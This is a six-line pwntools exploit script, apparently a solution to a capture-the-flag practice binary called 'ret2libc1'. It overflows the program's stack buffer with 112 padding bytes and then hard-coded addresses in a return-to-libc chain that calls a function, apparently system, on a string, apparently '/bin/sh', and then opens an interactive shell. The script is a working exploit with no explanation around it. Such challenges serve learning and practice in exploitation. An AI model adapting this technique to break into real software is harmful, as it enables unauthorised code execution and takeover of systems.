from pwn import *
p = process("./ret2libc1")
p.recvuntil("RET2LIBC >_<\n")
payload = b"a"*112 + p32(0x8048460) + b"xxxx" + p32(0x8048720)
p.sendline(payload)
p.interactive()
